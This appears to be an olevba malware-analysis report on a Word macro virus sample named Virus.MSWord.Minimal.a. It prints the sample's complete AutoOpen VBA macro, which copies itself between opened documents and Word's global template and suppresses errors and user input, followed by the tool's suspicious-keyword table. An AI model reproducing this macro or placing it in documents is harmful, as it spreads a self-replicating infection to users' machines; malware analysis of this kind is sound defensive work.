olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.a-3d322927315849b644ff2a2a20b2daf970899b04
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.a-3d322927315849b644ff2a2a20b2daf970899b04 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOOpen.bas 
in file: Virus.MSWord.Minimal.a-3d322927315849b644ff2a2a20b2daf970899b04 - OLE stream: 'Macros/VBA/aUTOOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
Dim Encrypt
On Error GoTo -1: On Error GoTo Gotit
WordBasic.FileSummaryInfo Update:=1
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (0)
Dim d1lg As Object: Set d1lg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1lg
fileMacro$ = d1lg.Directory + "\" + d1lg.FileName + ":aUTOOpen"
globMacro$ = "Global:aUTOOpen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4))
If MacroFile$ = ".DOT" Then
Encrypt = WordBasic.IsExecuteOnly(fileMacro$)
WordBasic.MacroCopy globMacro$, fileMacro$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy fileMacro$, globMacro$
End If
Gotit:
On Error GoTo -1: On Error GoTo 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

